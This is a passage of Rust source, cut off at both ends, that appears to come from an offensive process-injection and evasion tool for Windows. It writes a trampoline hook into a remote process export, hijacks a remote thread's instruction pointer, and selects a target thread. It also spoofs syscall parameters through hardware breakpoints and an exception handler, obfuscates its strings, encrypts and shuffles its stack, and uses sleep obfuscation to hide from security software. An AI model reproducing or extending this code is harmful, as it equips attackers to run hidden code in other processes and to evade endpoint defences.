        std::mem::size_of::<u64>(),
        &mut sz_output as *mut usize,
    );

    let read_status_low = nt_read_virtual_memory(
            process_handle,
            ((export_address as usize) + std::mem::size_of::<u64>()) as *mut c_void,
            &mut original_instructions_low as *mut _ as *mut c_void,
            std::mem::size_of::<u64>(),
            &mut sz_output
    );

    if read_status_high !=0 || read_status_low != 0 {
        panic!("{}", m!("failed to read memory"));
    }

    println!("{} {:#p} {:#p}", m!("original instructions"), original_instructions_high as *mut c_void, original_instructions_low as *mut c_void);

    trampoline[26..34].copy_from_slice(&original_instructions_high.to_le_bytes());
    trampoline[36..44].copy_from_slice(&original_instructions_low.to_le_bytes());
    trampoline[53..61].copy_from_slice(&(executable_code_address as u64).to_le_bytes());

    let mut trampoline_size = trampoline.len() as usize;
    let mut trampoline_address: *mut c_void = null_mut();

    let alloc_status = nt_allocate_virtual_memory(
        process_handle,
        &mut trampoline_address,
        0,
        &mut trampoline_size,
        MEM_COMMIT,
        PAGE_READWRITE,
    );

    if alloc_status != 0 {
        panic!("{} {:#X}", m!("failed to allocate memory. Status:"), alloc_status);
    }
    println!("{} {:#p}", m!("[+] Writing trampoline to:"), trampoline_address as *mut c_void);

    let write_status = nt_write_virtual_memory(
        process_handle,
        trampoline_address,
        trampoline.as_ptr() as *mut c_void,
        trampoline.len(),
        &mut sz_output,
    );
    if write_status != 0 {
        panic!("{} {:#X}", m!("failed to write memory"), write_status);
    }

    let mut old_protect: u32 = 0;
    //change protection of trampoline to PAGE_EXECUTE_READ
    let protect_status = nt_protect_virtual_memory(
        process_handle,
        &mut trampoline_address,
        &mut trampoline_size,
        PAGE_EXECUTE_READ,
        &mut old_protect,
    );

    if protect_status != 0 {
        panic!("{} {:#X}", m!("failed to change protection"), protect_status);
    }

    let mut hook: [u8; 12] = [
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0xFF, 0xD0
    ];

    hook[2..10].copy_from_slice(&(trampoline_address as u64).to_le_bytes());

    //before writing the hook, change memory protection of tarfet address
    let mut old_protect_hook: u32 = 0;
    let protect_jook_status = nt_protect_virtual_memory(
        process_handle,
        &mut export_address as *mut _ as *mut PVOID,
        &mut sz_output,
        PAGE_EXECUTE_READWRITE,
        &mut old_protect_hook,
    );

    if protect_jook_status != 0 {
        panic!("{} {:#X}", m!("failed to change protection"), protect_jook_status);
    }

    println!("{} {:#p}", m!("[+] Writing hook to:"), export_address as *mut c_void);

    let hook_status = nt_write_virtual_memory(
        process_handle,
        export_address as *mut c_void,
        hook.as_ptr() as *mut c_void,
        hook.len(),
        &mut sz_output,
    );

    if hook_status != 0 {
        panic!("{} {:#X}", m!("failed to write memory"), hook_status);
    }

    let mut hooked_bytes: [u8; 12] = [0; 12];

    loop {
        //wait 10 seconds for the hook to be called... use shelter sleep obfuscation
        let time_to_sleep = Some(10);
        let _ = shelter::fluctuate(false, time_to_sleep, None);


        let hook_check_status = nt_read_virtual_memory(
            process_handle,
            export_address as *mut c_void,
            &mut hooked_bytes as *mut _ as *mut c_void,
            hook.len(),
            &mut sz_output,
        );

        if hook_check_status != 0 {
            panic!("{} {:#X}", m!("failed to read memory"), hook_check_status);
        }

        if hooked_bytes != hook {
            break;
        }

    }

    println!("{} {:#p}", m!("[+] Freeing trampoline at:"), trampoline_address as *mut c_void);

    let mut size_null: usize = 0;
    let free_status = nt_free_virtual_memory(
        process_handle,
        &mut trampoline_address,
        &mut size_null as *mut _ as *mut usize,
        MEM_RELEASE,
    );

    if free_status != 0 {
        panic!("{} {:#X}", m!("failed to free memory"), free_status);
    }

    println!("{} {:#p}", m!("[+] Restoring original instructions at:"), original_export_address);

    let restore_status_high = nt_write_virtual_memory(
        process_handle,
        export_address as *mut c_void,
        &original_instructions_high as *const _ as *mut c_void,
        std::mem::size_of::<u64>(),
        &mut sz_output,
    );

    let restore_status_low = nt_write_virtual_memory(
        process_handle,
        ((export_address as usize) + std::mem::size_of::<u64>()) as *mut c_void,
        &original_instructions_low as *const _ as *mut c_void,
        std::mem::size_of::<u64>(),
        &mut sz_output,
    );

    if restore_status_high != 0 || restore_status_low != 0 {
        panic!("{} {:#X}", m!("failed to write memory"), restore_status_high);
    }

    let restore_protect_hook_status = nt_protect_virtual_memory(
        process_handle,
        &mut export_address as *mut _ as *mut PVOID,
        &mut sz_output,
        PAGE_EXECUTE_READ,  
        &mut old_protect_hook,
    );

    if restore_protect_hook_status != 0 {
        panic!("{} {:#X}", m!("failed to change protection"), restore_protect_hook_status);
    }

    true

}

pub fn get_process_id_by_name(process_name: &str) -> Result<u32, anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    let mut buffer: Vec<u8> = Vec::with_capacity(1024 * 1024);
    let mut return_length: u32 = 0;

    let status = nt_query_system_information(
            SystemProcessInformation,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.capacity() as u32,
            &mut return_length,
        );
        if status != STATUS_SUCCESS {
            return Err(anyhow::anyhow!(m!("failed to query system information").to_owned()));
        }

        unsafe {
            buffer.set_len(return_length as usize);
        }

        let mut process_info = buffer.as_ptr() as *mut SYSTEM_PROCESS_INFORMATION;

        loop {
            let current_process_name_ptr = unsafe { (*process_info).ImageName.Buffer };
            let current_process_name_length = unsafe { (*process_info).ImageName.Length } as usize;

            if !current_process_name_ptr.is_null() {
                let current_process_name = unsafe {
                    std::slice::from_raw_parts(current_process_name_ptr, current_process_name_length / 2)
                };
    
                let current_process_name_str = String::from_utf16_lossy(current_process_name);
    
                if current_process_name_str.to_lowercase() == process_name.to_lowercase() {
                    return Ok(unsafe { (*process_info).UniqueProcessId } as u32);
                }
            }
    
            if unsafe { (*process_info).NextEntryOffset } == 0 {
                break;
            }
    
            process_info = unsafe {
                (process_info as *const u8).add((*process_info).NextEntryOffset as usize)
            } as *mut SYSTEM_PROCESS_INFORMATION;
    
        }

        let _ = unsafe { nt_close((*process_info).UniqueProcessId as HANDLE) };

        dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

        Err(anyhow::anyhow!(m!("failed to find process id").to_owned()))
}


pub fn get_current_process_handle() -> Result<HANDLE, anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    let pseudo_handle = -1isize as HANDLE;
    let mut real_handle: HANDLE = null_mut();

    
    let status = nt_duplicate_object(
                pseudo_handle,
                pseudo_handle,
                pseudo_handle,
                &mut real_handle,
                PROCESS_ALL_ACCESS,
                0,
                DUPLICATE_SAME_ACCESS,
    );
        
    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    if status == 0 {
        Ok(real_handle)
    } else {
        Err(anyhow::anyhow!(m!("failed to get current process handle").to_owned()))
    }
}

pub fn get_pid_by_name(process_name: &str) -> Result<u32, anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    let mut buffer: Vec<u8> = Vec::with_capacity(1024 * 1024);
    let mut return_length: u32 = 0;
    let system_information_class = SYSTEM_INFORMATION_CLASS::default();

    let status = nt_query_system_information(
            system_information_class,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.capacity() as u32,
            &mut return_length,
    );


    if status != STATUS_SUCCESS { //NTSTATUS: STATUS_SUCCESS
        return Err(anyhow::anyhow!(m!("failed to query system information").to_owned()));

    }

    unsafe {
        buffer.set_len(return_length as usize);
    }

    let mut process_info = buffer.as_ptr() as *mut SYSTEM_PROCESS_INFORMATION;

    loop {
        let current_process_name_ptr = unsafe { (*process_info).ImageName.Buffer };
        let current_process_name_length = unsafe { (*process_info).ImageName.Length } as usize;

        if !current_process_name_ptr.is_null() {
            let current_process_name = unsafe {
                std::slice::from_raw_parts(current_process_name_ptr, current_process_name_length / 2)
            };

            let current_process_name_str = String::from_utf16_lossy(current_process_name);

            if current_process_name_str.to_lowercase() == process_name.to_lowercase() {
                return Ok(unsafe { (*process_info).UniqueProcessId } as u32  );
            }
        }

        if unsafe { (*process_info).NextEntryOffset } == 0 {
            break;
        }

        process_info = unsafe {
            (process_info as *const u8).add((*process_info).NextEntryOffset as usize)
        } as *mut SYSTEM_PROCESS_INFORMATION;

    }
    unsafe { nt_close((*process_info).UniqueProcessId as HANDLE) };

    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    Err(anyhow::anyhow!(m!("failed to find process id").to_owned()))
} 

pub fn get_current_process_id() -> Result<u32, anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    let pseudo_handle: HANDLE = -1isize as *mut c_void;
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed() };

    let status = nt_query_information_process(
            pseudo_handle,
            ProcessBasicInformation,
            &mut pbi as *mut _ as *mut c_void,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            std::ptr::null_mut::<u32>(),

    );

    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);
    
    if status == 0 {
        Ok(pbi.UniqueProcessId as u32)
    } else {
        Err(anyhow::anyhow!(m!("failed to get current process id").to_owned()))
    }

    
}

fn shuffle_stack(p: *mut u8, stack_size: usize) -> Vec<usize> {
    let mut order: Vec<usize> = (0..stack_size).collect();
    order.shuffle(&mut rand::thread_rng()); // Using rand crate for shuffling
    
    let mut shuffled_stack = vec![0u8; stack_size];
    for (i, &pos) in order.iter().enumerate() {
        unsafe {
            shuffled_stack[i] = *p.add(pos);
        }
    }
    
    for i in 0..stack_size {
        unsafe {
            *p.add(i) = shuffled_stack[i];
        }
    }
    
    order
}

fn restore_stack(p: *mut u8, stack_size: usize, order: Vec<usize>) {
    let mut original_stack = vec![0u8; stack_size];
    for i in 0..stack_size {
        unsafe {
            original_stack[order[i]] = *p.add(i);
        }
    }
    
    for i in 0..stack_size {
        unsafe {
            *p.add(i) = original_stack[i];
        }
    }
}


fn xor_encrypt(p: *mut u8, stack_size: usize, key: &[u8]) {
    let key_length = key.len();
    for i in 0..stack_size {
        unsafe {
            *p.add(i) ^= key[i % key_length];
        }
    }
}

fn set_bits(dw: u64, low_bit: i32, bits: i32, new_value: u64) -> u64 {
    let mask = (1 << bits) - 1;
    (dw & !(mask << low_bit)) | (new_value << low_bit)
}

fn clear_breakpoint(ctx: &mut CONTEXT, index: i32) {
    match index {
        0 => ctx.Dr0 = 0,
        1 => ctx.Dr1 = 0,
        2 => ctx.Dr2 = 0,
        3 => ctx.Dr3 = 0,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, (index * 2) as i32, 1, 0);
    ctx.Dr6 = 0;
    ctx.EFlags = 0;
}

fn enable_breakpoint(ctx: &mut CONTEXT, address: *mut u8, index: i32) {
    match index {
        0 => ctx.Dr0 = address as u64,
        1 => ctx.Dr1 = address as u64,
        2 => ctx.Dr2 = address as u64,
        3 => ctx.Dr3 = address as u64,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, 16, 16, 0);
    ctx.Dr7 = set_bits(ctx.Dr7, (index * 2) as i32, 1, 1);
    ctx.Dr6 = 0;
}

fn get_arg(ctx: &CONTEXT, index: i32) -> usize {
    match index {
        0 => ctx.Rcx as usize,
        1 => ctx.Rdx as usize,
        2 => ctx.R8 as usize,
        3 => ctx.R9 as usize,
        _ => unsafe { *((ctx.Rsp as *const u64).offset((index + 1) as isize) as *const usize) }
    }
}

fn get_return_address(ctx: &CONTEXT) -> usize {
    unsafe { *((ctx.Rsp as *const u64) as *const usize) }
}

fn set_result(ctx: &mut CONTEXT, result: usize) {
    ctx.Rax = result as u64;
}

fn adjust_stack_pointer(ctx: &mut CONTEXT, amount: i32) {
    ctx.Rsp += amount as u64;
}

fn set_ip(ctx: &mut CONTEXT, new_ip: usize) {
    ctx.Rip = new_ip as u64;
}

// Function to find a gadget (a specific byte pattern) in memory
fn find_gadget(function: usize, stub: &[u8], size: usize, dist: usize) -> Option<usize> {
    for i in 0..dist {
        unsafe {
            let ptr = function + i;
            if std::slice::from_raw_parts(ptr as *const u8, size) == stub {
                return Some(ptr);
            }
        }
    }
    None
}

pub fn find_rx_section_offset(process: &mut Process, module_base: usize) -> anyhow::Result<u32> {
    let dos_header: IMAGE_DOS_HEADER = read_memory(process.process_handle as *mut c_void, module_base). expect("gytefvup;wa938e37");
    let nt_headers: IMAGE_NT_HEADERS = read_memory(process.process_handle as *mut c_void, module_base + dos_header.e_lfanew as usize). expect("gytefvup;wa938e37");

    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section_header: IMAGE_SECTION_HEADER = read_memory(
            process.process_handle as *mut c_void,
            module_base + dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS>()  + (i as usize) * std::mem::size_of::<IMAGE_SECTION_HEADER>(),

        ).expect(m!("Failed to read section header"));

        if (section_header.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0
            && (section_header.Characteristics & IMAGE_SCN_MEM_READ) != 0
        {
            
            return Ok(section_header.VirtualAddress);
        }
    }

    
        Ok(0)
}

pub fn find_rx_section_size(process: &mut Process, module_base: usize) -> Result<u32, anyhow::Error> {
    let dos_header: IMAGE_DOS_HEADER = read_memory(process.process_handle as *mut c_void, module_base)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
    let nt_headers: IMAGE_NT_HEADERS = read_memory(process.process_handle as *mut c_void, module_base + dos_header.e_lfanew as usize)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;

    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section_header: IMAGE_SECTION_HEADER = read_memory(
            process.process_handle as *mut c_void,
            module_base + dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS>() + (i as usize) * std::mem::size_of::<IMAGE_SECTION_HEADER>(),
        ).map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
        
        if (section_header.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0
            && (section_header.Characteristics & IMAGE_SCN_MEM_READ) != 0
        {
            //return Ok(section_header.SizeOfRawData);
            return Ok(section_header.SizeOfRawData);
        }
    }

    Ok(0)
}


fn read_memory<T>(process_handle: *mut c_void, address: usize) -> Result<T, anyhow::Error> {
   
    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    let mut buffer: T = unsafe { std::mem::zeroed() };
    let mut buffer_size = std::mem::size_of::<T>();

    let status = nt_read_virtual_memory(
            process_handle as HANDLE,
            address as PVOID,
            &mut buffer as *mut T as PVOID,
            buffer_size,
            &mut buffer_size,
    );
       

    if status != 0 {
        panic!("{} {:p} {} {:#X}", m!("Failed to read memory at address"),  address as *const u8, m!("with NTSTATUS:"), status);
    }

    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    Ok(buffer)

    
   
}

fn get_threads_handle(process_id: u32) -> Result<Vec<HANDLE>, anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    let mut buffer: Vec<u8> = Vec::with_capacity(1024 * 1024);
    let mut return_length: u32 = 0;

    let status = nt_query_system_information(
            SystemProcessInformation,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.capacity() as u32,
            &mut return_length,
        );

    if !NT_SUCCESS(status) {
        return Err(anyhow::anyhow!(m!("failed to query system information").to_owned()));
    }

    unsafe {
        buffer.set_len(return_length as usize);
    }

    let mut offset: usize = 0;
    let mut thread_handles: Vec<HANDLE> = Vec::new();

    while offset < buffer.len() {
        let process_info: &SYSTEM_PROCESS_INFORMATION = unsafe {
            &*(buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION)
        };

        if process_info.UniqueProcessId == process_id as PVOID {
            let thread_array_base = (process_info as *const _ as usize) + std::mem::size_of::<SYSTEM_PROCESS_INFORMATION>() - std::mem::size_of::<SYSTEM_THREAD_INFORMATION>();

            for i in 0..process_info.NumberOfThreads as usize {
                let thread_info_ptr = (thread_array_base + i * std::mem::size_of::<SYSTEM_THREAD_INFORMATION>()) as *const SYSTEM_THREAD_INFORMATION;
                let thread_info = unsafe { &*thread_info_ptr };

                let mut thread_handle: HANDLE = null_mut();
                let mut object_attrs: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
                let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed() };
                client_id.UniqueThread = thread_info.ClientId.UniqueThread;

                let status = nt_open_thread(
                        &mut thread_handle,
                        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                        &mut object_attrs,
                        &mut client_id,

                    );

                if NT_SUCCESS(status) {
                    thread_handles.push(thread_handle);
                }
            }
        }

        if process_info.NextEntryOffset == 0 {
            break;
        }
        offset += process_info.NextEntryOffset as usize;
    }
    if thread_handles.is_empty() {
        return Err(anyhow::anyhow!(m!("failed to get thread handles").to_owned()));
    }
    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    Ok(thread_handles)

    
}

pub fn get_module_base_by_name(module_name: &str, process_id: u32) -> Result<*mut u8, anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);


    let process_handle = get_process_handle(process_id)?;
    let _object_attributes: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed::<OBJECT_ATTRIBUTES>() };
    let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed::<CLIENT_ID>() };
    client_id.UniqueProcess = process_id as *mut c_void; //PVOID

    let mut process_basic_info: PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed::<PROCESS_BASIC_INFORMATION>() };
    let mut return_length: u32 = 0;

    let status = nt_query_information_process(
        process_handle as *mut c_void,
        ProcessBasicInformation,
        &mut process_basic_info as *mut PROCESS_BASIC_INFORMATION as *mut c_void,
        std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
        &mut return_length,
    );

    if status != 0 {
        return Err(anyhow::anyhow!(m!("failed to query information process").to_owned()));
    }

    let pbi = process_basic_info.PebBaseAddress;
    let mut peb: PEB = unsafe { std::mem::zeroed::<PEB>() };

    let status = nt_read_virtual_memory(
        process_handle as HANDLE,
        pbi as PVOID,
        &mut peb as *mut PEB as *mut c_void,
        std::mem::size_of::<PEB>() as usize,
        std::ptr::null_mut::<usize>(),
    );

    if status != 0 {
        return Err(anyhow::anyhow!(m!("failed to read PEB").to_owned()));
    }

    let mut ldr_data: PEB_LDR_DATA = unsafe { std::mem::zeroed::<PEB_LDR_DATA>() };
    let status = nt_read_virtual_memory(
        process_handle as HANDLE,
        peb.Ldr as PVOID,
        &mut ldr_data as *mut PEB_LDR_DATA as *mut c_void,
        std::mem::size_of::<PEB_LDR_DATA>() as usize,
        std::ptr::null_mut::<usize>(),
    );

    if status != 0 {
        return Err(anyhow::anyhow!(m!("failed to read PEB LDR").to_owned()));
    }

    let mut ldr_entry: LDR_DATA_TABLE_ENTRY = unsafe { std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>() };
    let mut current = ldr_data.InLoadOrderModuleList.Flink;

    loop {
        //let process_handle = get_process_handle(process_id);
        let ldr_entry_address = (current as usize - offset_of!(LDR_DATA_TABLE_ENTRY, InLoadOrderLinks)) as *mut LDR_DATA_TABLE_ENTRY;
        let status = nt_read_virtual_memory(
            process_handle as *mut c_void,
            ldr_entry_address as PVOID,
            &mut ldr_entry as *mut LDR_DATA_TABLE_ENTRY as *mut c_void,
            std::mem::size_of::<LDR_DATA_TABLE_ENTRY>() as usize,
            std::ptr::null_mut::<usize>(),
        );

        if status != 0 {
            return Err(anyhow::anyhow!(m!("failed to read LDR_DATA_TABLE_ENTRY").to_owned()));
        }

        let module_name_length = ldr_entry.BaseDllName.Length as usize;
        let mut module_name_vec = vec![0u16; module_name_length / 2];
        let status = nt_read_virtual_memory(
            process_handle as *mut c_void,
            ldr_entry.BaseDllName.Buffer as PVOID,
            module_name_vec.as_mut_ptr() as *mut c_void,
            module_name_length as usize,
            std::ptr::null_mut::<usize>(),
        );

        if status != 0 {
            return Err(anyhow::anyhow!(m!("failed to read module name").to_owned()));
        }

        let current_module_name = String::from_utf16_lossy(&module_name_vec);
        if current_module_name.to_lowercase() == module_name.to_lowercase() {
            nt_close(process_handle as *mut c_void);
            return Ok(ldr_entry.DllBase as *mut u8);
        }

        if current == ldr_data.InLoadOrderModuleList.Flink {
            break;
        }

        current = ldr_entry.InLoadOrderLinks.Flink;
    }
    
    nt_close(process_handle as *mut c_void);

    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    Err(anyhow::anyhow!(m!("failed to find module").to_owned()))


}

fn get_process_handle(process_id: u32) -> Result<isize, anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    let mut object_attrs: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
    let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed() };
    let mut handle: HANDLE = null_mut();

    client_id.UniqueProcess = process_id as *mut c_void;

    let status = nt_open_process(
            &mut handle,
            PROCESS_ALL_ACCESS,
            &mut object_attrs,
            &mut client_id, 
    );

    //handle errors properly
    if status != 0 {
        return Err(anyhow::anyhow!(m!("failed to open process").to_owned()));
    }

    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    Ok(handle as isize)
}

pub fn get_proc_address(module_base: *mut u8, function_name: &str) -> Result<*mut c_void, anyhow::Error> {
    unsafe {
        let dos_header = *module_base.cast::<IMAGE_DOS_HEADER>();
        if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
            return Err(anyhow::anyhow!(m!("Invalid DOS signature").to_owned()));
        }

        let nt_headers_ptr = module_base.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS;
        let nt_headers = *nt_headers_ptr;

        if nt_headers.Signature != IMAGE_NT_SIGNATURE {
            return Err(anyhow::anyhow!(m!("Invalid NT signature").to_owned()));
        }
        let export_dir_rva = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
        let export_dir = module_base.add(export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;

        let functions = module_base.add((*export_dir).AddressOfFunctions as usize) as *const u32;
        let names = module_base.add((*export_dir).AddressOfNames as usize) as *const u32;
        let ordinals = module_base.add((*export_dir).AddressOfNameOrdinals as usize) as *const u16;

        //iterate using a for loop to find the function
        for i in 0..(*export_dir).NumberOfNames {
            let name_rva = *names.add(i as usize);
            let name_ptr = module_base.add(name_rva as usize) as *const c_char;
            let name_str = CStr::from_ptr(name_ptr).to_str().unwrap_or("");

            if name_str == function_name {
                let ordinal = *ordinals.add(i as usize) as usize;
                let function_rva = *functions.add(ordinal);
                let function_ptr = module_base.add(function_rva as usize) as *mut c_void;
                return Ok(function_ptr);
            }
        }

        Err(anyhow::anyhow!(m!("Function not found").to_owned()))
    }
}

fn get_remote_thread_handle(process_id: u32) -> Result<HANDLE, anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    let mut buffer: Vec<u8> = Vec::with_capacity(1024 * 1024);
    let mut return_length: u32 = 0;

    let status = nt_query_system_information(
            SystemProcessInformation,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.capacity() as u32,
            &mut return_length,
    );

    if !NT_SUCCESS(status) {
        return Err(anyhow::anyhow!(m!("failed to query system information").to_owned()));
    }

    unsafe {
        buffer.set_len(return_length as usize);
    }

    let system_dlls = ["kernel32.dll", "ntdll.dll"];

    let mut system_dll_bases: Vec<*mut u8> = Vec::new();
    for dll in &system_dlls {
        if let std::result::Result::Ok(base) = get_module_base_by_name(dll, process_id) {
            system_dll_bases.push(base);
        }
    }

    let mut offset: usize = 0;
    let mut potential_threads: Vec<(&SYSTEM_THREAD_INFORMATION, LARGE_INTEGER)> = Vec::new();

    while offset < buffer.len() {
        let process_info: &SYSTEM_PROCESS_INFORMATION = unsafe {
            &*(buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION)
        };

        if process_info.UniqueProcessId == process_id as PVOID {
            let thread_array_base = (process_info as *const _ as usize) + std::mem::size_of::<SYSTEM_PROCESS_INFORMATION>() - std::mem::size_of::<SYSTEM_THREAD_INFORMATION>();

            dbg!("{} {}", m!("Threads Found:"), process_info.NumberOfThreads);

            for i in 0..process_info.NumberOfThreads as usize {
                let thread_info_ptr = (thread_array_base + i * std::mem::size_of::<SYSTEM_THREAD_INFORMATION>()) as *const SYSTEM_THREAD_INFORMATION;
                let current_thread_info = unsafe { &*thread_info_ptr };

                potential_threads.push((current_thread_info, current_thread_info.UserTime));
            }
        }

        if process_info.NextEntryOffset == 0 {
            break;
        }
        offset += process_info.NextEntryOffset as usize;
    }

    //sort the potential threads based on the ranking criteria
    potential_threads.sort_by(|&(a, a_time), &(b, b_time)| {
        let a_system_dll = system_dll_bases.iter().any(|&dll_base| {
            (a.StartAddress as *mut u8) >= dll_base && (a.StartAddress as *mut u8) < unsafe { dll_base.add(0x1000000) }
        });
        let b_system_dll = system_dll_bases.iter().any(|&dll_base| {
            (b.StartAddress as *mut u8) >= dll_base && (b.StartAddress as *mut u8) < unsafe { dll_base.add(0x1000000) }
        });

        match (a_system_dll, b_system_dll) {
            (true, false) => std::cmp::Ordering::Less,
            (false, true) => std::cmp::Ordering::Greater,
            _ => {
                match a.BasePriority.cmp(&b.BasePriority) {
                    std::cmp::Ordering::Equal => unsafe { a_time.QuadPart().cmp(b_time.QuadPart()) },
                    other => other,
                }
            }
        }
    });

    let best_thread =potential_threads.first().map(|&(thread, _)| thread);
    dbg!("{} {}", m!("selected best thread:"), best_thread.unwrap().ClientId.UniqueThread as u32);

    if let Some(thread_info) = best_thread {
        let mut thread_handle: HANDLE = null_mut();
        let mut onject_attrs: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
        let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed() };
        client_id.UniqueThread = thread_info.ClientId.UniqueThread;

        let status = nt_open_thread(
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            &mut onject_attrs,
            &mut client_id,
        );

        if !NT_SUCCESS(status) {
            return Err(anyhow::anyhow!(m!("failed to open thread").to_owned()));
        }

        dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

        return Ok(thread_handle);
    }

    Err(anyhow::anyhow!(m!("failed to find thread handle").to_owned()))

}

fn jmp_hijack_thread(h_thread: HANDLE, p_address: PVOID, h_process: HANDLE) -> Result<(), anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    //suspend the thread
    let status = nt_suspend_thread(h_thread, std::ptr::null_mut::<ULONG>());
    if !NT_SUCCESS(status) {
        return Err(anyhow::anyhow!(m!("failed to suspend thread").to_owned()));
    } 

    //1. get the current thread context
    let mut context: CONTEXT = unsafe { std::mem::zeroed() };
    context.ContextFlags = CONTEXT_ALL;

    let status_get_context = nt_get_context_thread(h_thread, &mut context as *mut _);
    if !NT_SUCCESS(status_get_context) {
        return Err(anyhow::anyhow!(m!("failed to get thread context").to_owned()));
    }

    //2, backup the current memory at RIP
    let mut original_memory = [0u8; 12];
    let status_read_memory =nt_read_virtual_memory(
            h_process,
            context.Rip as *mut c_void,
            original_memory.as_mut_ptr() as *mut _, 
            original_memory.len() as SIZE_T, 
            std::ptr::null_mut::<usize>(),
    );

    if !NT_SUCCESS(status_read_memory) {
        return Err(anyhow::anyhow!(m!("failed to read memory").to_owned()));
    }

    //3. change memory protection to PAGE_READWRITE
    let mut old_protect = 0;
    let base_address = context.Rip as *mut PVOID;

    let status_protect_memory = nt_protect_virtual_memory(
            h_process,
            base_address,
            &mut original_memory.len() as *mut _,
            PAGE_READWRITE,
            &mut old_protect,
    );

    if !NT_SUCCESS(status_protect_memory) {
